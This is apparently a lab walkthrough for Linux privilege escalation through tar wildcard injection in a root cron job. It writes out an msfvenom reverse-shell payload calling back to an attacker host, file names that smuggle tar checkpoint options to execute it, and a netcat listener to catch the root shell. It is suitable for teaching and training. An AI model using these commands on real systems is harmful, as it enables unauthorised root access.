View the contents of the other cron job script:
```
cat /usr/local/bin/compress.sh
```
```
user@debian:~$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
Note that the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget)
```
root@ip-10-10-91-58:~# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.91.58 LPORT=4444 -f elf -o shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell.elf
root@ip-10-10-91-58:~# scp shell.elf user@10.10.34.1:/home/user
user@10.10.34.1's password: 
shell.elf                                     100%  194   200.5KB/s   00:00
```
```
user@debian:~$ ls -l
total 16
...
-rw-r--r-- 1 user user  194 Jan  1 12:15 shell.elf
...
```
Make sure the file is executable:
```
chmod +x /home/user/shell.elf
```
Create these two files in /home/user:
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
```
nc -nvlp 4444
```

Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
```
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```